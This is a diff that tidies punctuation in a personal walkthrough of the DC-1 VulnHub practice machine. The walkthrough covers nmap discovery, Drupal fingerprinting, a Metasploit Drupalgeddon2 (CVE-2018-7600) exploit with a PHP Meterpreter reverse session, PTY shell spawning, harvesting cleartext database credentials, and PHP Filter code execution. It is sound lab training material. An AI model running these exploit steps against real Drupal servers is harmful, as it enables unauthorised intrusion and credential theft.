@@ -1,4 +1,4 @@
-# DC-1 (VulnHub) — My Walkthrough
+# DC-1 (VulnHub): My Walkthrough
 
 **Target:** 10.0.2.4 | **Attacker:** Kali, 10.0.2.6 | **Result:** Root, all 5 flags
 
@@ -14,7 +14,7 @@ Since my lab runs on a NAT Network with DHCP, IPs shift between reboots, so the 
 sudo nmap -sn 10.0.2.0/24
 ```
 
-`-sn` just does host discovery, no ports — I don't need port info yet, I just need to know DC-1 is at `.4` today.
+`-sn` just does host discovery, no ports, I don't need port info yet, I just need to know DC-1 is at `.4` today.
 
 ## 2. What's actually running
 
@@ -30,11 +30,11 @@ This gave me SSH (OpenSSH 6.0p1 Debian), HTTP (Apache 2.2.22 Debian), and RPC on
 curl -s http://10.0.2.4/ | grep -i generator
 ```
 
-I tried `CHANGELOG.txt` first out of habit but it 404'd, so I fell back on grepping the page source for Drupal's `<meta name="Generator">` tag instead — that confirmed Drupal 7 for me.
+I tried `CHANGELOG.txt` first out of habit but it 404'd, so I fell back on grepping the page source for Drupal's `<meta name="Generator">` tag instead, that confirmed Drupal 7 for me.
 
 ## 4. Going in with Drupalgeddon2
 
-Drupal 7 immediately made me think of CVE-2018-7600 — Drupalgeddon2 — since it's such a well-known unauthenticated RCE for this exact version range. I fired up Metasploit:
+Drupal 7 immediately made me think of CVE-2018-7600, Drupalgeddon2, since it's such a well-known unauthenticated RCE for this exact version range. I fired up Metasploit:
 
 ```bash
 msfconsole -q
@@ -47,7 +47,7 @@ set LHOST 10.0.2.6
 run
 ```
 
-I set the payload to a PHP Meterpreter specifically because the exploit runs through the web server — needs to be PHP-based to actually execute in that context. `LHOST` is my Kali box, not the target, which trips people up sometimes if they're new to this.
+I set the payload to a PHP Meterpreter specifically because the exploit runs through the web server, needs to be PHP-based to actually execute in that context. `LHOST` is my Kali box, not the target, which trips people up sometimes if they're new to this.
 
 This landed me a Meterpreter session as `www-data`.
 
@@ -58,7 +58,7 @@ shell
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-The raw shell from Meterpreter's `shell` command is annoying to work with — no job control, weird behavior on things like `mysql` or `su`. Spawning a proper PTY with Python fixes that. Worth noting DC-1 only has Python 2, so `python3` won't work here.
+The raw shell from Meterpreter's `shell` command is annoying to work with: no job control, weird behavior on things like `mysql` or `su`. Spawning a proper PTY with Python fixes that. Worth noting DC-1 only has Python 2, so `python3` won't work here.
 
 ## 6. Hunting for flags
 
@@ -74,7 +74,7 @@ This turned up `/var/www/flag1.txt` and `/home/flag4/flag4.txt` right away. Read
 cat /var/www/sites/default/settings.php
 ```
 
-Drupal stores its DB credentials in cleartext in this file — `dbuser` / `R0ck3t` / database `drupaldb`. Flag 2 was actually sitting in this same file as a comment, basically telling me "use these creds, don't bother cracking anything."
+Drupal stores its DB credentials in cleartext in this file: `dbuser` / `R0ck3t` / database `drupaldb`. Flag 2 was actually sitting in this same file as a comment, basically telling me "use these creds, don't bother cracking anything."
 
 ## 8. Looking at the users table
 
@@ -117,7 +117,7 @@ Once I was in as admin:
 ```
 5. Saved and viewed the page
 
-Drupal 7's PHP Filter module runs any saved content as raw PHP — since I was logged in as admin, that gave me code execution as `www-data` right through the normal web interface, no separate exploit needed for this part.
+Drupal 7's PHP Filter module runs any saved content as raw PHP, since I was logged in as admin, that gave me code execution as `www-data` right through the normal web interface, no separate exploit needed for this part.
 
 ---
 
